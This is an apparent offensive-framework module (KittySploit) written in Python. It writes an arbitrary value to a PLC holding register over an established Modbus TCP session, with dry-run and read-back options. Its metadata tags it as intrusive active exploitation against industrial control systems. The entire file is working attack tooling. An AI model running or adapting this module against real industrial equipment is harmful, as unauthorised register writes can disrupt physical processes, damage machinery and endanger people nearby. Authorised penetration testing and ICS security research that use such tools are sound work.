#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.ics_session_mixin import ModbusSessionMixin


class Module(Post, ModbusSessionMixin):
    __info__ = {
        "name": "Modbus write register",
        "description": (
            "Writes a single holding register over Modbus TCP via an active Modbus session. "
            "Supports dry-run mode to validate connectivity without changing the PLC."
        ),
        "author": "KittySploit Team",
        "session_type": SessionType.MODBUS,
        "tags": ["ics", "modbus", "write", "manage"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "consumes_capabilities": ["file_read"],
                "produces_capabilities": ["rce"],
            },
        },
    }

    unit_id = OptInteger(0, "Modbus unit ID (0 = use session default)", False)
    address = OptInteger(0, "Register address", True)
    value = OptInteger(0, "Register value to write", True)
    dry_run = OptBool(False, "Validate connection only — do not write", False)
    verify = OptBool(True, "Read back the register after writing", False)

    def check(self):
        sid = str(self.session_id or "").strip()
        if not sid:
            print_error("Session ID not set")
            return False
        session = self.framework.session_manager.get_session(sid) if self.framework else None
        if not session:
            print_error(f"Session {sid} not found")
            return False
        if str(session.session_type).lower() != SessionType.MODBUS.value:
            print_error(f"Session is not Modbus (type: {session.session_type})")
            return False
        try:
            self.open_modbus()
            return True
        except Exception as exc:
            print_error(f"Modbus connection error: {exc}")
            return False

    def _effective_unit_id(self) -> int:
        configured = int(self.unit_id or 0)
        if configured > 0:
            return configured
        info = self.get_modbus_connection_info()
        return int(info.get("unit_id") or 1)

    def run(self):
        client = self.open_modbus()
        unit = self._effective_unit_id()
        address = int(self.address)
        value = int(self.value)

        if bool(self.dry_run):
            before = client.read_holding_registers(unit, address, 1)
            current = before.values[0] if before.success and before.values else "n/a"
            print_success(
                f"Dry run OK — unit={unit} register {address} current value={current} "
                f"(would write {value})"
            )
            return True

        print_warning(f"Writing register {address} = {value} on unit {unit}")
        result = client.write_single_register(unit, address, value)
        if not result.success:
            print_error(result.raw_error or f"Write rejected (exception {result.error_code})")
            return False

        print_success(f"Write accepted for register {address} = {value}")
        if bool(self.verify):
            after = client.read_holding_registers(unit, address, 1)
            if after.success and after.values:
                print_info(f"Verified value: {after.values[0]}")
        return True
